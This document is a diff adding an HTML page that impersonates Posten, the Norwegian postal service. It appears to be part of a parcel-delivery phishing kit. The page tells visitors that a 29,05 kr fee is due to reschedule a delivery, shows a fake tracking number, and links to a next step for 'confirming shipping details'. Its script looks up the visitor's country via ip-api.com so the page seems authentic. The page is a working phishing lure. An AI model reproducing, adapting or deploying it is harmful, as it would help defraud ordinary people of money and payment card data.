@@ -1,0 +1,169 @@
+<!DOCTYPE html>
+<html lang="no">
+<head>
+  <meta charset="UTF-8" />
+      <link rel="icon" href="./X9/icon.jpeg" type="icon.jpeg"> 
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Posten - Pakkeinfo</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: Arial, sans-serif;
+      background-color: #fff;
+      color: #000;
+    }
+
+    header {
+      background: #fff;
+      padding: 20px 0;
+      text-align: center;
+    }
+
+    header img {
+      width: 120px;
+      max-width: 100%;
+      height: auto;
+    }
+
+    .info-box {
+      border: 1px solid #e60000;
+      margin: 20px;
+      padding: 20px;
+      border-radius: 5px;
+      max-width: 600px;
+      margin-left: auto;
+      margin-right: auto;
+    }
+
+    .info-box h2 {
+      font-size: 18px;
+      margin-top: 0;
+      color: #333;
+      text-align: center;
+    }
+
+    .warning {
+      color: #b20000;
+      font-size: 14px;
+      margin-bottom: 10px;
+      text-align: center;
+    }
+
+    .info-box p {
+      font-size: 15px;
+      line-height: 1.5;
+    }
+
+    .info-box strong {
+      color: #000;
+    }
+
+    .info-box img {
+      width: 100%;
+      border-radius: 5px;
+      margin: 15px 0;
+    }
+
+    .note {
+      font-weight: bold;
+      margin-top: 10px;
+    }
+
+    .button {
+      display: block;
+      width: 90%;
+      max-width: 300px;
+      margin: 25px auto 10px;
+      padding: 12px;
+      background-color: #d32f2f;
+      color: white;
+      text-align: center;
+      text-decoration: none;
+      font-size: 16px;
+      border-radius: 5px;
+      cursor: pointer;
+      transition: background 0.3s ease;
+    }
+
+    .button:hover {
+      background-color: #b71c1c;
+    }
+
+    footer {
+      background-color: #450000;
+      color: white;
+      text-align: center;
+      padding: 20px 10px;
+      font-size: 14px;
+      margin-top: 40px;
+    }
+
+    footer img {
+      width: 100px;
+      max-width: 100%;
+      height: auto;
+    }
+
+    /* Responsive Design */
+    @media (min-width: 768px) {
+      .info-box {
+        padding: 30px;
+        font-size: 16px;
+      }
+
+      .info-box h2 {
+        font-size: 20px;
+      }
+
+      .button {
+        font-size: 18px;
+        padding: 14px;
+      }
+    }
+  </style>
+</head>
+<body>
+
+  <header>
+    <img src="./X9/A.png" alt="Posten">
+  </header>
+
+  <div class="info-box">
+    <h2>Din pakkeinformasjon</h2>
+    <p class="warning">⚠️ Advarsel: en fraktavgift på 29,05 kr påløper for å omplanlegge leveringen din</p>
+    <hr>
+    <p><strong>Date :</strong> <span class="dynamic-date">Laster...</span></p>
+    <p><strong>Tracking Number :</strong> 56449874154</p>
+    <p><strong>Parcel Details :</strong> Pakken din venter på fraktdetaljer.</p>
+    <p><strong>Pakkelokalisering :</strong> <span class="dynamic-location">Laster...</span></p>
+    <img src="./X9/C.png" alt="Map">
+    <p class="note">Viktig merknad : Leveringskostnader kan påløpe.</p>
+    <a class="button" href="B1.html">Bekreft fraktdetaljer</a>
+  </div>
+
+  <footer>
+    <img src="./X9/A.png" alt="Posten Logo">
+    <p>© Posten Bring</p>
+  </footer>
+
+  <script>
+    // التاريخ حسب الجهاز
+    const today = new Date();
+    const formattedDate = `${today.getDate()}/${today.getMonth() + 1}/${today.getFullYear()}`;
+    document.querySelector(".dynamic-date").innerText = formattedDate;
+
+    // الموقع الجغرافي حسب IP
+    fetch("https://ip-api.com/json/")
+      .then(res => res.json())
+      .then(data => {
+        const location = `${data.country} (${data.countryCode})`;
+        document.querySelector(".dynamic-location").innerText = location;
+      })
+      .catch(() => {
+        document.querySelector(".dynamic-location").innerText = "Ukjent";
+      });
+  </script>
+
+</body>
+</html>
